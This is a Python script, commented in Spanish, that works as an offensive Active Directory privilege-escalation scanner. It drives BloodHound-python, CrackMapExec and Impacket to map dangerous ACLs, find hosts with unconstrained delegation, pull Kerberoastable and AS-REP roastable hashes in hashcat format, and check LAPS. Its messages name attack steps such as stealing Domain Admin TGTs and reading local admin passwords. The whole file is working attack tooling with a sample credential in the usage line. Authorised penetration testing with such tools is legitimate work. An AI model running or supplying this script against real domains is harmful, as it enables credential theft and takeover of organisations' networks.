#!/usr/bin/env python3
"""
privesc_scanner.py — Escaner de vectores de escalada de privilegios en AD
MITRE ATT&CK: T1222 (ACL Abuse) · T1484 (GPO Abuse) · T1134 (Impersonation)

Uso:
    python3 privesc_scanner.py --dc 192.168.1.10 --domain empresa.local \
        -u juan.garcia -p "Password123!"
"""

import argparse
import subprocess
import sys


class C:
    RED="\033[91m";GREEN="\033[92m";YELLOW="\033[93m"
    BLUE="\033[94m";CYAN="\033[96m";BOLD="\033[1m";RESET="\033[0m"

def ok(m):   print(C.GREEN+  "  [+] "+C.RESET+m)
def info(m): print(C.BLUE+   "  [*] "+C.RESET+m)
def warn(m): print(C.YELLOW+ "  [!] "+C.RESET+m)
def crit(m): print(C.RED+C.BOLD+"  [VECTOR] "+C.RESET+m)


def banner():
    print(C.YELLOW+C.BOLD+"""
  ╔══════════════════════════════════════════════════╗
  ║   PRIVESC SCANNER — ACL · GPO · Delegation       ║
  ╚══════════════════════════════════════════════════╝
"""+C.RESET)


def check_dangerous_acls(dc, domain, user, password):
    """Busca ACLs peligrosas usando BloodHound-python."""
    info("Buscando ACLs peligrosas con BloodHound-python...")
    cmd = [
        "bloodhound-python", "-d", domain,
        "-u", user, "-p", password,
        "-ns", dc, "-c", "ACL",
    ]
    try:
        result = subprocess.run(cmd, text=True, capture_output=True, timeout=120)
        if result.returncode == 0:
            ok("Datos ACL recopilados — importar JSON en BloodHound")
            ok("Query: 'Find Shortest Paths to Domain Admins'")
        else:
            warn("BloodHound-python fallo: " + result.stderr[:200])
            info("Instalar: pip install bloodhound")
    except FileNotFoundError:
        warn("bloodhound-python no instalado: pip install bloodhound")


def check_kerberos_delegation(dc, domain, user, password):
    """Busca equipos con Unconstrained Delegation (muy peligroso)."""
    info("Buscando Unconstrained Delegation...")
    cmd = [
        "crackmapexec", "ldap", dc,
        "-u", user, "-p", password,
        "-d", domain,
        "--trusted-for-delegation",
    ]
    try:
        result = subprocess.run(cmd, text=True, capture_output=True, timeout=30)
        output = result.stdout
        print(output)
        if any(x in output for x in ["[+]", "TRUSTED_FOR_DELEGATION"]):
            crit("Equipos con Unconstrained Delegation encontrados")
            crit("Vector: robar TGTs cuando un DA se conecte al equipo")
    except FileNotFoundError:
        warn("CrackMapExec no disponible")


def check_asrep_and_spn(dc, domain, user, password):
    """Identifica usuarios kerberoastables y AS-REP roastables."""
    info("Buscando usuarios Kerberoastables...")
    cmd = ["impacket-GetUserSPNs", domain+"/"+user+":"+password,
           "-dc-ip", dc]
    try:
        result = subprocess.run(cmd, text=True, capture_output=True, timeout=30)
        if "$krb5tgs$" in result.stdout or "ServicePrincipalName" in result.stdout:
            crit("Usuarios Kerberoastables detectados")
            print(result.stdout[:500])
        else:
            ok("No se detectaron usuarios Kerberoastables")
    except FileNotFoundError:
        warn("impacket no disponible")

    info("Buscando usuarios AS-REP Roastables...")
    cmd2 = ["impacket-GetNPUsers", domain+"/",
            "-dc-ip", dc, "-request",
            "-format", "hashcat", "-no-pass"]
    try:
        result2 = subprocess.run(cmd2, text=True, capture_output=True, timeout=30)
        if "$krb5asrep$" in result2.stdout:
            crit("Usuarios AS-REP Roastables detectados")
            print(result2.stdout[:300])
        else:
            ok("No se detectaron usuarios AS-REP Roastables")
    except FileNotFoundError:
        pass


def check_laps(dc, domain, user, password):
    """Comprueba si LAPS esta implementado."""
    info("Verificando LAPS (Local Admin Password Solution)...")
    cmd = ["crackmapexec", "ldap", dc,
           "-u", user, "-p", password, "-d", domain, "--laps"]
    try:
        result = subprocess.run(cmd, text=True, capture_output=True, timeout=30)
        print(result.stdout[:400])
        if "ms-MCS-AdmPwd" in result.stdout:
            crit("LAPS implementado — intentar leer contrasenas de admin local")
        else:
            warn("LAPS no detectado — posibles contrasenas de admin local reutilizadas")
    except FileNotFoundError:
        warn("CrackMapExec no disponible")


def main():
    banner()
    p = argparse.ArgumentParser(description="privesc_scanner.py — Vectores de escalada AD")
    p.add_argument("--dc",     required=True)
    p.add_argument("--domain", required=True)
    p.add_argument("-u", "--user",     required=True)
    p.add_argument("-p", "--password", required=True)
    args = p.parse_args()

    sep = "─" * 55
    print("\n  " + sep)
    print("  ESCANEO: " + args.domain + " | Usuario: " + args.user)
    print("  " + sep + "\n")

    check_asrep_and_spn(args.dc, args.domain, args.user, args.password)
    print()
    check_dangerous_acls(args.dc, args.domain, args.user, args.password)
    print()
    check_kerberos_delegation(args.dc, args.domain, args.user, args.password)
    print()
    check_laps(args.dc, args.domain, args.user, args.password)
    print()
    info("Analisis completado. Importar JSONs de BloodHound para ver rutas completas.")

if __name__ == "__main__":
    main()
